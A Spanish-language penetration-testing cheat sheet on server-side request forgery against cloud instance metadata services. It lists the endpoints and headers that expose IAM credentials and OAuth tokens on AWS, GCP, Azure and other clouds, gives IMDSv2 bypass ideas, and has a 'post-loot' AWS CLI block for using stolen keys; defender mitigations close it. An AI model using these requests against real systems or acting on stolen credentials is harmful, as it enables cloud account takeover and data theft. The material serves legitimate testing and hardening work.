---
aliases:
  - Cloud Metadata SSRF
  - IMDS Abuse
  - AWS Metadata SSRF
tags:
  - type/cheatsheet
  - vuln/ssrf
  - technique/credential-access
  - technique/privilege-escalation
  - asset/web-app
  - asset/cloud
  - env/cloud-aws
  - env/cloud-azure
  - env/cloud-gcp
primary categories:
secondary categories:
tertiary categories:
type: CheatSheet
linked:
  - "[[Server-Side Request Forgery (SSRF)]]"
---
# SSRF - Cloud Metadata

***

## Cheatsheet

| **Cloud** | **Endpoint** | **Loot** |
|:---:|:---:|---|
| **AWS IMDSv1** | `http://169.254.169.254/latest/meta-data/` | Instance role, hostname, userdata. |
| **AWS IAM creds** | `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` | `AccessKeyId`, `SecretAccessKey`, `Token` (STS). |
| **AWS IMDSv2** | `PUT /latest/api/token` → header `X-aws-ec2-metadata-token-ttl-seconds: 21600` | Requiere token primero, luego GET con header `X-aws-ec2-metadata-token`. |
| **GCP** | `http://metadata.google.internal/computeMetadata/v1/` + header `Metadata-Flavor: Google` | Service account tokens, project ID, SSH keys. |
| **GCP token** | `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` | OAuth token scoped a service account. |
| **Azure** | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` + header `Metadata: true` | VM config, managed identity. |
| **Azure token** | `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net` | OAuth token para MSI. |
| **DigitalOcean** | `http://169.254.169.254/metadata/v1/` | Droplet metadata + user-data. |
| **Alibaba** | `http://100.100.100.200/latest/meta-data/` | Instance role, RAM security credentials. |
| **Oracle Cloud** | `http://192.0.0.192/latest/` | Instance metadata. |
^ssrf-cloud

___

## Overview

Cada cloud provider expone un **endpoint de metadata** en link-local IP (`169.254.169.254` para AWS/Azure/DO, `100.100.100.200` para Alibaba, `192.0.0.192` para Oracle). Accesible desde dentro de la VM sin auth — intended para que el OS descubra su config.

SSRF contra este endpoint = **credential access directo** → IAM role → AWS API access → S3, RDS, Lambda, KMS. Escalación típica cloud post-foothold.

### Mecanismos de Acción

- **AWS IMDSv1** (legacy): GET simple al endpoint, sin headers especiales. Retorna JSON plano con credentials.
- **AWS IMDSv2** (2019+, default Nitro): requiere two-step — primero PUT para obtener token (TTL 6h max), luego GET con ese token. Diseñado para mitigar SSRF — muchos SSRF no soportan PUT o headers custom.
  - Bypass IMDSv2: si SSRF permite PUT + headers → aún explotable.
  - Soluciones parciales: redirect chains, TRACE method, HTTP smuggling.
- **Metadata-Flavor: Google** header requerido en GCP — sin él, retorna 403. SSRFs que controlan solo URL fallan.
- **Azure api-version**: siempre query param obligatorio. Sin él, 400 Bad Request.

### Post-loot workflow

```bash
# AWS — usar credentials robados
aws configure set aws_access_key_id <ASIA...>
aws configure set aws_secret_access_key <...>
aws configure set aws_session_token <...>

# Enum de permisos con creds comprometidas
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name <role>
aws s3 ls

# Herramientas específicas
pacu         # AWS pentest framework
scout suite  # Multi-cloud audit
```

### Mitigaciones del defender

- **AWS**: forzar IMDSv2 only (`HttpTokens: required` en instance metadata options).
- **GCP**: bloquear acceso a `metadata.google.internal` desde aplicaciones via firewall / iptables.
- **Azure**: habilitar Managed Identity solo en VMs específicas + scope minimum.
- **Network segmentation**: block egress a 169.254.x.x desde app tier.
- **SSRF hardening en app**: validar scheme + host pre-fetch, no seguir redirects a RFC1918 / link-local.

***
